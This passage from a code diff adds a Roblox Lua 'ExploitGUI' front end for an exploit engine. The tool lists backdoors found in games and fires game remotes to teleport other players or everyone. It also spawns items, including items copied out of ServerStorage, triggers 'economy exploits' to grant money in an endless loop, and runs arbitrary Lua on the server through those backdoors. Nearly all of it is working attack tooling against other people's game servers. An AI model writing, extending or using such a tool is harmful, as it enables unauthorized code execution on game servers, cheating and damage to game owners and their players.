+            ListFrame.Size = UDim2.new(0.8, 0, 0.8, 0)
+            ListFrame.Position = UDim2.new(0.1, 0, 0.1, 0)
+            ListFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            ListFrame.BorderSizePixel = 0
+            ListFrame.ZIndex = 10
+            ListFrame.Parent = self.ScreenGui
+
+            local ListCorner = Instance.new("UICorner")
+            ListCorner.CornerRadius = UDim.new(0, 15)
+            ListCorner.Parent = ListFrame
+
+            local ListTitle = Instance.new("TextLabel")
+            ListTitle.Name = "ListTitle"
+            ListTitle.Size = UDim2.new(1, 0, 0, 50)
+            ListTitle.Position = UDim2.new(0, 0, 0, 0)
+            ListTitle.BackgroundTransparency = 1
+            ListTitle.Text = "All Backdoors (" .. #self.Engine.Backdoors .. ")"
+            ListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+            ListTitle.TextSize = 24
+            ListTitle.Font = Enum.Font.SourceSansBold
+            ListTitle.ZIndex = 11
+            ListTitle.Parent = ListFrame
+
+            local CloseListButton = Instance.new("TextButton")
+            CloseListButton.Name = "CloseListButton"
+            CloseListButton.Size = UDim2.new(0, 40, 0, 40)
+            CloseListButton.Position = UDim2.new(1, -50, 0, 10)
+            CloseListButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+            CloseListButton.BorderSizePixel = 0
+            CloseListButton.Text = "✕"
+            CloseListButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            CloseListButton.TextSize = 24
+            CloseListButton.Font = Enum.Font.SourceSansBold
+            CloseListButton.ZIndex = 11
+            CloseListButton.Parent = ListFrame
+
+            local CloseListCorner = Instance.new("UICorner")
+            CloseListCorner.CornerRadius = UDim.new(0, 20)
+            CloseListCorner.Parent = CloseListButton
+
+            local ListScrollFrame = Instance.new("ScrollingFrame")
+            ListScrollFrame.Name = "ListScrollFrame"
+            ListScrollFrame.Size = UDim2.new(0.95, 0, 0.85, 0)
+            ListScrollFrame.Position = UDim2.new(0.025, 0, 0.12, 0)
+            ListScrollFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            ListScrollFrame.BorderSizePixel = 0
+            ListScrollFrame.ScrollBarThickness = 10
+            ListScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(220, 20, 60)
+            ListScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #self.Engine.Backdoors * 30 + 20)
+            ListScrollFrame.ZIndex = 11
+            ListScrollFrame.Parent = ListFrame
+
+            local ListScrollCorner = Instance.new("UICorner")
+            ListScrollCorner.CornerRadius = UDim.new(0, 10)
+            ListScrollCorner.Parent = ListScrollFrame
+
+            -- Add all backdoors to the list
+            for i, backdoor in ipairs(self.Engine.Backdoors) do
+                local BackdoorLabel = Instance.new("TextLabel")
+                BackdoorLabel.Name = "Backdoor" .. i
+                BackdoorLabel.Size = UDim2.new(1, -20, 0, 20)
+                BackdoorLabel.Position = UDim2.new(0, 10, 0, 10 + (i-1) * 30)
+                BackdoorLabel.BackgroundTransparency = 1
+                BackdoorLabel.Text = i .. ". " .. backdoor.name .. " (" .. backdoor.type .. ") - " .. backdoor.path
+                BackdoorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                BackdoorLabel.TextSize = 14
+                BackdoorLabel.Font = Enum.Font.SourceSans
+                BackdoorLabel.TextXAlignment = Enum.TextXAlignment.Left
+                BackdoorLabel.ZIndex = 12
+                BackdoorLabel.Parent = ListScrollFrame
+
+                -- Add risk level indicator
+                if backdoor.riskLevel then
+                    local RiskLabel = Instance.new("TextLabel")
+                    RiskLabel.Name = "Risk" .. i
+                    RiskLabel.Size = UDim2.new(0, 80, 0, 20)
+                    RiskLabel.Position = UDim2.new(1, -90, 0, 10 + (i-1) * 30)
+                    RiskLabel.BackgroundTransparency = 1
+                    RiskLabel.Text = backdoor.riskLevel
+                    RiskLabel.TextColor3 = backdoor.riskLevel == "Critical" and Color3.fromRGB(220, 20, 60) or
+                                          backdoor.riskLevel == "High" and Color3.fromRGB(255, 69, 0) or
+                                          backdoor.riskLevel == "Medium" and Color3.fromRGB(255, 165, 0) or
+                                          Color3.fromRGB(50, 205, 50)
+                    RiskLabel.TextSize = 14
+                    RiskLabel.Font = Enum.Font.SourceSansBold
+                    RiskLabel.TextXAlignment = Enum.TextXAlignment.Right
+                    RiskLabel.ZIndex = 12
+                    RiskLabel.Parent = ListScrollFrame
+                end
+            end
+
+            CloseListButton.MouseButton1Click:Connect(function()
+                ListFrame:Destroy()
+            end)
+        end)
+    end
+end
+
+function ExploitGUI:CreateTeleportContent()
+    -- Teleport Player Card
+    local TeleportCard = self:CreateCard("Teleport Player", "Teleport yourself or others to a location")
+
+    local PlayerInput = self:CreateTextInput(TeleportCard, "Player Name (leave empty for self)")
+    PlayerInput.Position = UDim2.new(0, 20, 0, 100)
+
+    local LocationInput = self:CreateTextInput(TeleportCard, "Location (leave empty for spawn)")
+    LocationInput.Position = UDim2.new(0, 20, 0, 150)
+
+    local TeleportButton = self:CreateButton(TeleportCard, "TELEPORT", Color3.fromRGB(70, 130, 180))
+    TeleportButton.Position = UDim2.new(0, 20, 0, 200)
+
+    local StatusLabel = self:CreateStatusLabel(TeleportCard)
+    StatusLabel.Position = UDim2.new(1, -140, 0, 200)
+
+    TeleportButton.MouseButton1Click:Connect(function()
+        StatusLabel.Text = "Teleporting..."
+
+        local playerName = PlayerInput.Text
+        if playerName == "" then
+            playerName = Player.Name
+        end
+
+        local destination = LocationInput.Text
+        if destination == "" then
+            destination = "Spawn"
+        end
+
+        -- Try teleport remotes first
+        local success = false
+        for _, remote in ipairs(self.Engine.RemoteEvents) do
+            if remote.name:lower():find("teleport") then
+                success = pcall(function()
+                    remote.remote:FireServer({
+                        player = playerName,
+                        destination = destination
+                    })
+                    return true
+                })
+
+                if success then
+                    StatusLabel.Text = "Teleported successfully through " .. remote.name
+                    StatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+                    return
+                end
+
+                -- Try different payload format
+                success = pcall(function()
+                    remote.remote:FireServer(playerName, destination)
+                    return true
+                })
+
+                if success then
+                    StatusLabel.Text = "Teleported successfully through " .. remote.name
+                    StatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+                    return
+                end
+            end
+        end
+
+        -- If remotes fail, try backdoor execution
+        local success, result = self.Engine:ExecuteCode([[
+            local Players = game:GetService("Players")
+            local targetPlayer = Players:FindFirstChild("]] .. playerName .. [[")
+
+            if targetPlayer and targetPlayer.Character then
+                local destination = ]] .. (destination ~= "Spawn" and destination or "game.Workspace.SpawnLocation.Position") .. [[
+                targetPlayer.Character:SetPrimaryPartCFrame(CFrame.new(destination))
+                return "Teleported " .. targetPlayer.Name
+            else
+                return "Player character not found"
+            end
+        ]])
+
+        StatusLabel.Text = success and "Teleported successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+        StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Teleport All Card
+    local TeleportAllCard = self:CreateCard("Teleport All Players", "Teleport everyone to a location")
+    TeleportAllCard.LayoutOrder = 1
+
+    local AllLocationInput = self:CreateTextInput(TeleportAllCard, "Location (leave empty for spawn)")
+    AllLocationInput.Position = UDim2.new(0, 20, 0, 100)
+
+    local TeleportAllButton = self:CreateButton(TeleportAllCard, "TELEPORT ALL", Color3.fromRGB(70, 130, 180))
+    TeleportAllButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local AllStatusLabel = self:CreateStatusLabel(TeleportAllCard)
+
+    TeleportAllButton.MouseButton1Click:Connect(function()
+        AllStatusLabel.Text = "Teleporting all players..."
+
+        local destination = AllLocationInput.Text
+        if destination == "" then
+            destination = "Spawn"
+        end
+
+        -- Use backdoor to teleport all players
+        local success, result = self.Engine:ExecuteCode([[
+            local Players = game:GetService("Players")
+            local destination = ]] .. (destination ~= "Spawn" and destination or "game.Workspace.SpawnLocation.Position") .. [[
+
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player and player.Character then
+                    player.Character:SetPrimaryPartCFrame(CFrame.new(destination))
+                end
+            end
+
+            return "Teleported all players"
+        ]])
+
+        AllStatusLabel.Text = success and "All players teleported! " .. tostring(result) or "Failed: " .. tostring(result)
+        AllStatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Teleport to Player Card
+    local TeleportToCard = self:CreateCard("Teleport to Player", "Teleport yourself to another player")
+    TeleportToCard.LayoutOrder = 2
+
+    local TargetInput = self:CreateTextInput(TeleportToCard, "Target Player Name")
+    TargetInput.Position = UDim2.new(0, 20, 0, 100)
+
+    local TeleportToButton = self:CreateButton(TeleportToCard, "TELEPORT TO", Color3.fromRGB(70, 130, 180))
+    TeleportToButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local ToStatusLabel = self:CreateStatusLabel(TeleportToCard)
+
+    TeleportToButton.MouseButton1Click:Connect(function()
+        ToStatusLabel.Text = "Teleporting to player..."
+
+        local targetName = TargetInput.Text
+        if targetName == "" then
+            ToStatusLabel.Text = "Please enter a target player name"
+            ToStatusLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
+            return
+        end
+
+        local targetPlayer = Players:FindFirstChild(targetName)
+        if not targetPlayer or not targetPlayer.Character then
+            ToStatusLabel.Text = "Target player not found"
+            ToStatusLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
+            return
+        end
+
+        local success = pcall(function()
+            Player.Character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame)
+        end)
+
+        ToStatusLabel.Text = success and "Teleported to player!" or "Failed to teleport"
+        ToStatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Available Teleport Remotes Card
+    local RemotesCard = self:CreateCard("Available Teleport Remotes", "List of teleport remotes found in the game")
+    RemotesCard.LayoutOrder = 3
+
+    local teleportRemotes = {}
+    for _, remote in ipairs(self.Engine.RemoteEvents) do
+        if remote.name:lower():find("teleport") then
+            table.insert(teleportRemotes, remote)
+        end
+    end
+
+    RemotesCard.Size = UDim2.new(1, -40, 0, 100 + math.min(#teleportRemotes, 5) * 30)
+
+    local remoteY = 100
+    for i, remote in ipairs(teleportRemotes) do
+        if i <= 5 then -- Limit to 5 remotes to avoid making the card too large
+            local RemoteLabel = Instance.new("TextLabel")
+            RemoteLabel.Name = "Remote" .. i
+            RemoteLabel.Size = UDim2.new(1, -40, 0, 20)
+            RemoteLabel.Position = UDim2.new(0, 20, 0, remoteY)
+            RemoteLabel.BackgroundTransparency = 1
+            RemoteLabel.Text = remote.name .. " (" .. remote.path .. ")"
+            RemoteLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            RemoteLabel.TextSize = 14
+            RemoteLabel.Font = Enum.Font.SourceSans
+            RemoteLabel.TextXAlignment = Enum.TextXAlignment.Left
+            RemoteLabel.Parent = RemotesCard
+
+            remoteY = remoteY + 30
+        end
+    end
+
+    if #teleportRemotes == 0 then
+        local NoRemotesLabel = Instance.new("TextLabel")
+        NoRemotesLabel.Name = "NoRemotesLabel"
+        NoRemotesLabel.Size = UDim2.new(1, -40, 0, 20)
+        NoRemotesLabel.Position = UDim2.new(0, 20, 0, 100)
+        NoRemotesLabel.BackgroundTransparency = 1
+        NoRemotesLabel.Text = "No teleport remotes found in the game"
+        NoRemotesLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        NoRemotesLabel.TextSize = 14
+        NoRemotesLabel.Font = Enum.Font.SourceSans
+        NoRemotesLabel.TextXAlignment = Enum.TextXAlignment.Left
+        NoRemotesLabel.Parent = RemotesCard
+    end
+end
+
+function ExploitGUI:CreateItemsContent()
+    -- Spawn Item Card
+    local SpawnCard = self:CreateCard("Spawn Items", "Spawn items for yourself")
+
+    local ItemInput = self:CreateTextInput(SpawnCard, "Item Name")
+    ItemInput.Position = UDim2.new(0, 20, 0, 100)
+
+    local QuantityInput = self:CreateTextInput(SpawnCard, "Quantity")
+    QuantityInput.Position = UDim2.new(0, 20, 0, 150)
+    QuantityInput.Text = "1"
+
+    local SpawnButton = self:CreateButton(SpawnCard, "SPAWN ITEM", Color3.fromRGB(255, 165, 0))
+    SpawnButton.Position = UDim2.new(0, 20, 0, 200)
+
+    local StatusLabel = self:CreateStatusLabel(SpawnCard)
+    StatusLabel.Position = UDim2.new(1, -140, 0, 200)
+
+    SpawnButton.MouseButton1Click:Connect(function()
+        StatusLabel.Text = "Spawning items..."
+
+        local itemName = ItemInput.Text
+        if itemName == "" then
+            itemName = "VIP_Item"
+        end
+
+        local quantity = tonumber(QuantityInput.Text) or 1
+
+        -- Try spawn remotes
+        local success = false
+        for _, remote in ipairs(self.Engine.RemoteEvents) do
+            if remote.name:lower():find("spawn") or remote.name:lower():find("drop") or remote.name:lower():find("give") then
+                success = pcall(function()
+                    for i = 1, quantity do
+                        remote.remote:FireServer(itemName)
+                    end
+                    return true
+                })
+
+                if success then
+                    StatusLabel.Text = "Items spawned through " .. remote.name
+                    StatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+                    return
+                end
+
+                -- Try different payload format
+                success = pcall(function()
+                    for i = 1, quantity do
+                        remote.remote:FireServer({
+                            item = itemName,
+                            quantity = 1
+                        })
+                    end
+                    return true
+                })
+
+                if success then
+                    StatusLabel.Text = "Items spawned through " .. remote.name
+                    StatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+                    return
+                end
+            end
+        end
+
+        -- If remotes fail, try backdoor execution
+        local success, result = self.Engine:ExecuteCode([[
+            local Players = game:GetService("Players")
+            local targetPlayer = Players:FindFirstChild("]] .. Player.Name .. [[")
+
+            if targetPlayer then
+                -- Try to find the item
+                local item = nil
+
+                -- Look in ReplicatedStorage
+                for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+                    if v:IsA("Tool") and (v.Name:lower():find("]] .. itemName:lower() .. [[") or "]] .. itemName .. [[" == "VIP_Item") then
+                        item = v:Clone()
+                        break
+                    end
+                end
+
+                -- Look in ServerStorage if we have access
+                if not item and game:FindFirstChild("ServerStorage") then
+                    for _, v in pairs(game.ServerStorage:GetDescendants()) do
+                        if v:IsA("Tool") and (v.Name:lower():find("]] .. itemName:lower() .. [[") or "]] .. itemName .. [[" == "VIP_Item") then
+                            item = v:Clone()
+                            break
+                        end
+                    end
+                end
+
+                -- If we found an item, give it to the player
+                if item then
+                    for i = 1, ]] .. quantity .. [[ do
+                        local clone = item:Clone()
+                        clone.Parent = targetPlayer.Backpack
+                    end
+                    return "Gave " .. ]] .. quantity .. [[ .. " " .. item.Name .. " to " .. targetPlayer.Name
+                else
+                    -- If we couldn't find the item, create a generic one
+                    for i = 1, ]] .. quantity .. [[ do
+                        local newItem = Instance.new("Tool")
+                        newItem.Name = "]] .. itemName .. [["
+                        newItem.Parent = targetPlayer.Backpack
+
+                        local handle = Instance.new("Part")
+                        handle.Name = "Handle"
+                        handle.Size = Vector3.new(1, 4, 1)
+                        handle.Parent = newItem
+                    end
+                    return "Created " .. ]] .. quantity .. [[ .. " generic " .. "]] .. itemName .. [[" .. " for " .. targetPlayer.Name
+                end
+            else
+                return "Player not found"
+            end
+        ]])
+
+        StatusLabel.Text = success and "Items spawned successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+        StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Common Items Card
+    local CommonItemsCard = self:CreateCard("Common Items", "Spawn frequently used items")
+    CommonItemsCard.LayoutOrder = 1
+
+    local commonItems = {
+        "Sword",
+        "Gun",
+        "Admin",
+        "VIP",
+        "Jetpack",
+        "SuperPower"
+    }
+
+    local buttonPositionY = 100
+    for i, itemName in ipairs(commonItems) do
+        local ItemButton = self:CreateButton(CommonItemsCard, itemName, Color3.fromRGB(255, 165, 0))
+        ItemButton.Size = UDim2.new(0, 120, 0, 40)
+        ItemButton.Position = UDim2.new(i % 2 == 1 and 0 or 0.5, i % 2 == 1 and 20 or -140, 0, buttonPositionY)
+
+        if i % 2 == 0 then
+            buttonPositionY = buttonPositionY + 50
+        end
+
+        ItemButton.MouseButton1Click:Connect(function()
+            -- Try spawn remotes
+            local success = false
+            for _, remote in ipairs(self.Engine.RemoteEvents) do
+                if remote.name:lower():find("spawn") or remote.name:lower():find("drop") or remote.name:lower():find("give") then
+                    success = pcall(function()
+                        remote.remote:FireServer(itemName)
+                        return true
+                    })
+
+                    if success then
+                        local StatusLabel = CommonItemsCard:FindFirstChild("StatusLabel")
+                        if not StatusLabel then
+                            StatusLabel = self:CreateStatusLabel(CommonItemsCard)
+                            StatusLabel.Position = UDim2.new(0, 20, 0, buttonPositionY + 50)
+                        end
+
+                        StatusLabel.Text = itemName .. " spawned through " .. remote.name
+                        StatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+                        return
+                    end
+                end
+            end
+
+            -- If remotes fail, try backdoor execution
+            local success, result = self.Engine:ExecuteCode([[
+                local Players = game:GetService("Players")
+                local targetPlayer = Players:FindFirstChild("]] .. Player.Name .. [[")
+
+                if targetPlayer then
+                    -- Try to find the item
+                    local item = nil
+
+                    -- Look in ReplicatedStorage
+                    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+                        if v:IsA("Tool") and v.Name:lower():find("]] .. itemName:lower() .. [[") then
+                            item = v:Clone()
+                            break
+                        end
+                    end
+
+                    -- Look in ServerStorage if we have access
+                    if not item and game:FindFirstChild("ServerStorage") then
+                        for _, v in pairs(game.ServerStorage:GetDescendants()) do
+                            if v:IsA("Tool") and v.Name:lower():find("]] .. itemName:lower() .. [[") then
+                                item = v:Clone()
+                                break
+                            end
+                        end
+                    end
+
+                    -- If we found an item, give it to the player
+                    if item then
+                        item.Parent = targetPlayer.Backpack
+                        return "Gave " .. item.Name .. " to " .. targetPlayer.Name
+                    else
+                        -- If we couldn't find the item, create a generic one
+                        local newItem = Instance.new("Tool")
+                        newItem.Name = "]] .. itemName .. [["
+                        newItem.Parent = targetPlayer.Backpack
+
+                        local handle = Instance.new("Part")
+                        handle.Name = "Handle"
+                        handle.Size = Vector3.new(1, 4, 1)
+                        handle.Parent = newItem
+
+                        return "Created generic " .. "]] .. itemName .. [[" .. " for " .. targetPlayer.Name
+                    end
+                else
+                    return "Player not found"
+                end
+            ]])
+
+            local StatusLabel = CommonItemsCard:FindFirstChild("StatusLabel")
+            if not StatusLabel then
+                StatusLabel = self:CreateStatusLabel(CommonItemsCard)
+                StatusLabel.Position = UDim2.new(0, 20, 0, buttonPositionY + 50)
+            end
+
+            StatusLabel.Text = success and itemName .. " spawned successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+            StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+        end)
+    end
+
+    -- Available Item Remotes Card
+    local RemotesCard = self:CreateCard("Available Item Remotes", "List of item-related remotes found in the game")
+    RemotesCard.LayoutOrder = 2
+
+    local itemRemotes = {}
+    for _, remote in ipairs(self.Engine.RemoteEvents) do
+        if remote.name:lower():find("item") or remote.name:lower():find("spawn") or remote.name:lower():find("give") or remote.name:lower():find("drop") then
+            table.insert(itemRemotes, remote)
+        end
+    end
+
+    RemotesCard.Size = UDim2.new(1, -40, 0, 100 + math.min(#itemRemotes, 5) * 30)
+
+    local remoteY = 100
+    for i, remote in ipairs(itemRemotes) do
+        if i <= 5 then -- Limit to 5 remotes to avoid making the card too large
+            local RemoteLabel = Instance.new("TextLabel")
+            RemoteLabel.Name = "Remote" .. i
+            RemoteLabel.Size = UDim2.new(1, -40, 0, 20)
+            RemoteLabel.Position = UDim2.new(0, 20, 0, remoteY)
+            RemoteLabel.BackgroundTransparency = 1
+            RemoteLabel.Text = remote.name .. " (" .. remote.path .. ")"
+            RemoteLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            RemoteLabel.TextSize = 14
+            RemoteLabel.Font = Enum.Font.SourceSans
+            RemoteLabel.TextXAlignment = Enum.TextXAlignment.Left
+            RemoteLabel.Parent = RemotesCard
+
+            remoteY = remoteY + 30
+        end
+    end
+
+    if #itemRemotes == 0 then
+        local NoRemotesLabel = Instance.new("TextLabel")
+        NoRemotesLabel.Name = "NoRemotesLabel"
+        NoRemotesLabel.Size = UDim2.new(1, -40, 0, 20)
+        NoRemotesLabel.Position = UDim2.new(0, 20, 0, 100)
+        NoRemotesLabel.BackgroundTransparency = 1
+        NoRemotesLabel.Text = "No item-related remotes found in the game"
+        NoRemotesLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        NoRemotesLabel.TextSize = 14
+        NoRemotesLabel.Font = Enum.Font.SourceSans
+        NoRemotesLabel.TextXAlignment = Enum.TextXAlignment.Left
+        NoRemotesLabel.Parent = RemotesCard
+    end
+end
+
+function ExploitGUI:CreateMoneyContent()
+    -- Get Money Card
+    local MoneyCard = self:CreateCard("Get Money", "Add money to your account")
+
+    local AmountInput = self:CreateTextInput(MoneyCard, "Amount")
+    AmountInput.Position = UDim2.new(0, 20, 0, 100)
+    AmountInput.Text = "999999"
+
+    local GetMoneyButton = self:CreateButton(MoneyCard, "GET MONEY", Color3.fromRGB(50, 205, 50))
+    GetMoneyButton.Position = UDim2.new(0, 20, 0, 150)
+
+    local StatusLabel = self:CreateStatusLabel(MoneyCard)
+
+    GetMoneyButton.MouseButton1Click:Connect(function()
+        StatusLabel.Text = "Getting money..."
+
+        local amount = tonumber(AmountInput.Text) or 999999
+
+        local success, result = self.Engine:GetMoney(amount)
+
+        StatusLabel.Text = success and "Money added successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+        StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+    end)
+
+    -- Individual Economy Exploits Card
+    local EconomyCard = self:CreateCard("Individual Economy Exploits", "Use specific economy exploits")
+    EconomyCard.LayoutOrder = 1
+    EconomyCard.Size = UDim2.new(1, -40, 0, 100 + math.min(#self.Engine.EconomyExploits, 8) * 40)
+
+    local exploitY = 100
+    for i, exploit in ipairs(self.Engine.EconomyExploits) do
+        if i <= 8 then -- Limit to 8 exploits to avoid making the card too large
+            local ExploitButton = self:CreateButton(EconomyCard, exploit.name, Color3.fromRGB(50, 205, 50))
+            ExploitButton.Size = UDim2.new(0.8, 0, 0, 30)
+            ExploitButton.Position = UDim2.new(0, 20, 0, exploitY)
+
+            -- Add tooltip with description
+            local Tooltip = Instance.new("TextLabel")
+            Tooltip.Name = "Tooltip" .. i
+            Tooltip.Size = UDim2.new(0.8, 0, 0, 0)
+            Tooltip.Position = UDim2.new(0, 20, 0, exploitY + 30)
+            Tooltip.BackgroundTransparency = 1
+            Tooltip.Text = exploit.description or "Economy exploit"
+            Tooltip.TextColor3 = Color3.fromRGB(200, 200, 200)
+            Tooltip.TextSize = 12
+            Tooltip.Font = Enum.Font.SourceSans
+            Tooltip.TextXAlignment = Enum.TextXAlignment.Left
+            Tooltip.TextWrapped = true
+            Tooltip.Parent = EconomyCard
+
+            ExploitButton.MouseButton1Click:Connect(function()
+                local amount = tonumber(AmountInput.Text) or 999999
+
+                local success, result = self.Engine:ExploitEconomyRemote(exploit.name, amount)
+
+                local StatusLabel = EconomyCard:FindFirstChild("StatusLabel")
+                if not StatusLabel then
+                    StatusLabel = self:CreateStatusLabel(EconomyCard)
+                    StatusLabel.Position = UDim2.new(0, 20, 0, exploitY + #self.Engine.EconomyExploits * 40 + 20)
+                end
+
+                StatusLabel.Text = success and "Exploit successful through " .. exploit.name or "Failed: " .. tostring(result)
+                StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+            end)
+
+            exploitY = exploitY + 40
+        end
+    end
+
+    if #self.Engine.EconomyExploits == 0 then
+        local NoExploitsLabel = Instance.new("TextLabel")
+        NoExploitsLabel.Name = "NoExploitsLabel"
+        NoExploitsLabel.Size = UDim2.new(1, -40, 0, 20)
+        NoExploitsLabel.Position = UDim2.new(0, 20, 0, 100)
+        NoExploitsLabel.BackgroundTransparency = 1
+        NoExploitsLabel.Text = "No economy exploits found in the game"
+        NoExploitsLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        NoExploitsLabel.TextSize = 14
+        NoExploitsLabel.Font = Enum.Font.SourceSans
+        NoExploitsLabel.TextXAlignment = Enum.TextXAlignment.Left
+        NoExploitsLabel.Parent = EconomyCard
+    end
+
+    -- Infinite Money Card
+    local InfiniteCard = self:CreateCard("Infinite Money", "Set up a loop to continuously add money")
+    InfiniteCard.LayoutOrder = 2
+
+    local LoopAmountInput = self:CreateTextInput(InfiniteCard, "Amount Per Loop")
+    LoopAmountInput.Position = UDim2.new(0, 20, 0, 100)
+    LoopAmountInput.Text = "10000"
+
+    local ExploitSelect = Instance.new("TextBox")
+    ExploitSelect.Name = "ExploitSelect"
+    ExploitSelect.Size = UDim2.new(0.8, 0, 0, 40)
+    ExploitSelect.Position = UDim2.new(0, 20, 0, 150)
+    ExploitSelect.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    ExploitSelect.BorderSizePixel = 0
+    ExploitSelect.Text = ""
+    ExploitSelect.PlaceholderText = "Exploit Name (leave empty for auto)"
+    ExploitSelect.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ExploitSelect.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    ExploitSelect.TextSize = 16
+    ExploitSelect.Font = Enum.Font.SourceSans
+    ExploitSelect.TextXAlignment = Enum.TextXAlignment.Left
+    ExploitSelect.Parent = InfiniteCard
+
+    local ExploitSelectPadding = Instance.new("UIPadding")
+    ExploitSelectPadding.PaddingLeft = UDim.new(0, 10)
+    ExploitSelectPadding.Parent = ExploitSelect
+
+    local ExploitSelectCorner = Instance.new("UICorner")
+    ExploitSelectCorner.CornerRadius = UDim.new(0, 8)
+    ExploitSelectCorner.Parent = ExploitSelect
+
+    local StartButton = self:CreateButton(InfiniteCard, "START LOOP", Color3.fromRGB(50, 205, 50))
+    StartButton.Position = UDim2.new(0, 20, 0, 200)
+
+    local StopButton = self:CreateButton(InfiniteCard, "STOP LOOP", Color3.fromRGB(220, 20, 60))
+    StopButton.Position = UDim2.new(0, 150, 0, 200)
+
+    local LoopStatusLabel = self:CreateStatusLabel(InfiniteCard)
+
+    local moneyLoop = nil
+
+    StartButton.MouseButton1Click:Connect(function()
+        if moneyLoop then
+            LoopStatusLabel.Text = "Loop is already running!"
+            return
+        end
+
+        local amount = tonumber(LoopAmountInput.Text) or 10000
+        local exploitName = ExploitSelect.Text
+
+        LoopStatusLabel.Text = "Starting money loop..."
+
+        moneyLoop = RunService.Heartbeat:Connect(function()
+            if exploitName ~= "" then
+                self.Engine:ExploitEconomyRemote(exploitName, amount)
+            else
+                self.Engine:GetMoney(amount)
+            end
+        end)
+
+        LoopStatusLabel.Text = "Money loop is running!"
+        LoopStatusLabel.TextColor3 = Color3.fromRGB(50, 205, 50)
+    end)
+
+    StopButton.MouseButton1Click:Connect(function()
+        if not moneyLoop then
+            LoopStatusLabel.Text = "No loop is running!"
+            return
+        end
+
+        moneyLoop:Disconnect()
+        moneyLoop = nil
+
+        LoopStatusLabel.Text = "Money loop stopped"
+        LoopStatusLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
+    end)
+end
+
+function ExploitGUI:CreateExecuteContent()
+    -- Execute Code Card
+    local ExecuteCard = self:CreateCard("Execute Server Code", "Run Lua code on the server")
+    ExecuteCard.Size = UDim2.new(1, -40, 0, 280)
+
+    local CodeInput = Instance.new("TextBox")
+    CodeInput.Name = "CodeInput"
+    CodeInput.Size = UDim2.new(1, -40, 0, 120)
+    CodeInput.Position = UDim2.new(0, 20, 0, 100)
+    CodeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    CodeInput.BorderSizePixel = 0
+    CodeInput.Text = "-- Enter Lua code to execute on the server\nprint(\"Hello from the server!\")"
+    CodeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CodeInput.TextSize = 16
+    CodeInput.Font = Enum.Font.SourceSans
+    CodeInput.TextXAlignment = Enum.TextXAlignment.Left
+    CodeInput.TextYAlignment = Enum.TextYAlignment.Top
+    CodeInput.ClearTextOnFocus = false
+    CodeInput.MultiLine = true
+    CodeInput.Parent = ExecuteCard
+
+    local CodeCorner = Instance.new("UICorner")
+    CodeCorner.CornerRadius = UDim.new(0, 8)
+    CodeCorner.Parent = CodeInput
+
+    local CodePadding = Instance.new("UIPadding")
+    CodePadding.PaddingTop = UDim.new(0, 10)
+    CodePadding.PaddingBottom = UDim.new(0, 10)
+    CodePadding.PaddingLeft = UDim.new(0, 10)
+    CodePadding.PaddingRight = UDim.new(0, 10)
+    CodePadding.Parent = CodeInput
+
+    local ExecuteButton = self:CreateButton(ExecuteCard, "EXECUTE", Color3.fromRGB(138, 43, 226))
+    ExecuteButton.Position = UDim2.new(0, 20, 0, 230)
+
+    local StatusLabel = self:CreateStatusLabel(ExecuteCard)
+    StatusLabel.Position = UDim2.new(1, -140, 0, 230)
+
+    ExecuteButton.MouseButton1Click:Connect(function()
+        StatusLabel.Text = "Executing code..."
+
+        local code = CodeInput.Text
+        if code == "" then
+            StatusLabel.Text = "Please enter code to execute"
+            StatusLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
+            return
+        end
+
+        local success, result = self.Engine:ExecuteCode(code)
+
+        StatusLabel.Text = success and "Code executed successfully!" or "Failed: " .. tostring(result)
+        StatusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+
+        -- Display result if available
+        if success and result then
+            local ResultFrame = Instance.new("Frame")
+            ResultFrame.Name = "ResultFrame"
